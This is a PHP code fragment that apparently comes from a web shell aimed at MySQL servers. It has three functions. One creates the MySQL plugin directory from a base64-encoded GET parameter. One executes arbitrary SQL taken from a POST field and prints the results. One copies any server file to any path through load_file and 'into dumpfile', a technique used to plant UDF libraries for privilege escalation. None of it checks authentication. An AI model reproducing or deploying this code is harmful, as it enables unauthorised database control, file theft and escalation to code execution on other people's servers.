function cplug(){
	$path = $_GET['dir'];
	$path = base64_decode($path);
	$arr = explode('\\',$path);
	$p = '';
	$err = '';
	for ($index = 0,$count = count($arr);$index<$count;$index++) {
		$p .= ($arr[$index] . '\\');
		if (!file_exists($p)) {
			if (!mkdir($p)) {
				$err = 'create '.$p.'failed !';
				break;
			}
		}
	}
	conn();
	if ($err != '')
		exit($err);
	if (file_exists($path))
		echo 'plugin_dir create success !';
	else
		echo 'plugin_dir create failed !';
}
function execsql() {
	$conn = conn(false);
	$sql = $_POST['sql'];
	if (get_magic_quotes_gpc())
		$sql = stripslashes($sql);
	$rs = mysql_query($sql,$conn);
	echo mysql_info($conn);
	if (@mysql_num_rows($rs) > 0) {
		echo '<table border="1">';
		$cols = mysql_num_fields($rs);
		$index = 0;
		echo '<tr>';
		while ($index < $cols) {
			echo '<th>'.mysql_field_name($rs,$index).'</th>';
			$index ++;
		}
		echo '</tr>';
		while ($row = mysql_fetch_row($rs)) {
			$index = 0;
			echo '<tr>';
			while ($index < $cols) {
				echo '<td>';
				echo str_replace(chr(13),'<br/>',htmlspecialchars($row[$index]));
				echo '</td>';
				$index ++;
			}
			echo '</tr>';
 		}
		echo '</table>';
	}
	if (mysql_errno($conn) != 0)
		echo mysql_error();
	mysql_close($conn);
}
function cp(){
	$conn = conn(false);
	$source = $_POST['source'];
	$target = $_POST['target'];
	if (get_magic_quotes_gpc()) {
		$source = stripslashes($source);
		$target = stripslashes($target);
	}
	mysql_query('select unhex(hex(load_file("'.$source.'"))) into dumpfile "'.$target.'"');
	if (mysql_errno($conn) != 0)
		echo mysql_error().'<br/>';
	else
		echo 'done !';
	mysql_close($conn);
}
